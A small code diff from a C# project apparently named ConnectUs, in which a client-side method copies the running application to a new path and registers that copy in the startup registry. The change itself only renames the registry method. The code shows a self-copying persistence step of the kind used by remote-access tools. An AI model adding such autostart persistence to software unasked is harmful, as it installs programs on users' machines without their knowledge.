@@ -28,7 +28,7 @@ namespace ConnectUs.Core.ClientSide
             var targetFilePath = Path.Combine(RootPath, fileName);
 
             _fileService.Copy(_environment.ApplicationPath, targetFilePath);
-            _registry.AddInStartupRegistry(targetFilePath);
+            _registry.AddFileToStartupRegistry(targetFilePath);
 
             return targetFilePath;
         }
